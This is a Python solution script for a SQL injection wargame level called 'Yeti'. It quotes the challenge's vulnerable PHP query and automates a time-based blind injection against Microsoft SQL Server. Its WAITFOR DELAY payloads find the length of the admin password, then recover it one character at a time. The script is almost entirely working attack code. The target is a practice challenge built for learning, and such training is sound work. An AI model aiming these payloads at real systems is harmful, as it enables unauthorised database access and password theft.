#!/usr/bin/env python3
import los
import los_cookies as lc


def check_func(*args) -> bool:
    """
    check time for request
    args[2]: time before request
    args[1]: time after request
    """
    return args[2] - args[1] > 4


def main():
    """
    Yeti 43

    Time-based Blind injection

    if(preg_match('/master|sys|information|;/i', $_GET['id'])) exit("No Hack ~_~");
    if(preg_match('/master|sys|information|;/i', $_GET['pw'])) exit("No Hack ~_~");
    $query = "select id from prob_yeti where id='{$_GET['id']}' and pw='{$_GET['pw']}'";
    echo "<hr>query : <strong>{$query}</strong><hr><br>";
    sqlsrv_query($db,$query);

    $query = "select pw from prob_yeti where id='admin'";
    $result = sqlsrv_fetch_array(sqlsrv_query($db,$query));
    if($result['pw'] === $_GET['pw']) solve("yeti");
    """

    url = "https://los.rubiya.kr/chall/yeti_e6afc70b892148ced2d1e063c1230255.php"
    cook = lc.check_cookies(url)
    method = 'get'
    inj_param = 'pw'
    other_param = {'id': 'admin'}

    final_response = ''
    while 'Clear!' not in final_response:

        payload = "' if ((select len(pw) from prob_yeti where id='admin')<%s) WAITFOR DELAY '0:0:5' else WAITFOR DELAY '0:0:0'-- "
        p = los.SqlInjection(url, cook, method, inj_param, payload, other_param=other_param)
        len_of_key = p.find_key_len(check_func)

        p.payload = f"' if(unicode(substring((select pw from prob_yeti where id='admin'),%d,1))<%s) WAITFOR DELAY '0:0:5' else WAITFOR DELAY '0:0:0'-- "
        result = p.find_binary(check_func, len_of_key)

        p.payload = result
        final_response = p.my_request()

    print('Yety Clear!')


if __name__ == '__main__':
    main()
